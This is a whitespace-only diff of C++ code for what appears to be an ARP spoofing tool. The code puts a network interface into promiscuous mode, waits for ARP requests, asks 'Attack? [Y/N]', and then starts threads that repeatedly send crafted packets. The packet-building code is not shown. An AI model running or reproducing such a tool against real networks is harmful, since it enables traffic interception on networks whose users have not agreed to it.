@@ -74,8 +74,8 @@ void attack(int socket, int ifindex, BYTE* intMac, const Arp& arp)
   {
     int ret;
     if ((ret = sendto(socket, buff, size, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
-			error();
-			return;
+      error();
+      return;
     }
     count++;
     std::this_thread::sleep_for(std::chrono::milliseconds(150));
@@ -141,9 +141,9 @@ int main(int argc, char** argv)
   std::cout << "Retrieve interface index...";
 
   struct ifreq ifr;
-	strcpy(ifr.ifr_name, argv[1]);
+  strcpy(ifr.ifr_name, argv[1]);
 
-	if (ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
+  if (ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
   {
     error();
     close(sockd);
@@ -179,7 +179,7 @@ int main(int argc, char** argv)
   ok();
   std::cout << "Retrieve interface flags... ";
 
-	if (ioctl(sockd, SIOCGIFFLAGS, &ifr) < 0)
+  if (ioctl(sockd, SIOCGIFFLAGS, &ifr) < 0)
   {
     error();
     close(sockd);
@@ -189,9 +189,9 @@ int main(int argc, char** argv)
   ok();
   std::cout << "Set interface to PROMISCUOUS mode... ";
 
-	ifr.ifr_flags |= IFF_PROMISC;
+  ifr.ifr_flags |= IFF_PROMISC;
 
-	if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
+  if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
   {
     error();
     close(sockd);
@@ -202,7 +202,7 @@ int main(int argc, char** argv)
   std::cout << "Start listen for ARP Request on " << ifr.ifr_name << " (" << MACToStr(intMac) << " " << IPToStr(intIp) << ")...";
   ok();
  
-	BYTE buff[BUFFSIZE];
+  BYTE buff[BUFFSIZE];
 
   while (run) 
   {
@@ -218,22 +218,22 @@ int main(int argc, char** argv)
       {
         std::cout << std::endl << arp.ToString() << std::endl;
 
-	char ch = '\0';
-	while (ch != 'y' && ch != 'Y' && ch != 'n' && ch != 'N')
+  char ch = '\0';
+  while (ch != 'y' && ch != 'Y' && ch != 'n' && ch != 'N')
         {
-	  std::cout << "Attack? [Y/N] ";
+    std::cout << "Attack? [Y/N] ";
           std::cin >> ch;
         }
 
-	if (ch == 'y' || ch == 'Y')
-	{
+  if (ch == 'y' || ch == 'Y')
+  {
           attackThread = new std::thread(attack, sockd, ifindex, intMac, arp);
           monitorThread = new std::thread(monitor, sockd, arp);
           break;
-	}
+  }
       }
     }
-	}
+  }
 
   if (attackThread != nullptr)
   {
@@ -241,7 +241,7 @@ int main(int argc, char** argv)
     monitorThread->join();
   }
 
-	ifr.ifr_flags &= ~IFF_PROMISC;  
+  ifr.ifr_flags &= ~IFF_PROMISC;  
   std::cout << "Unset interface from PROMISCUOUS mode...";
 
   if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
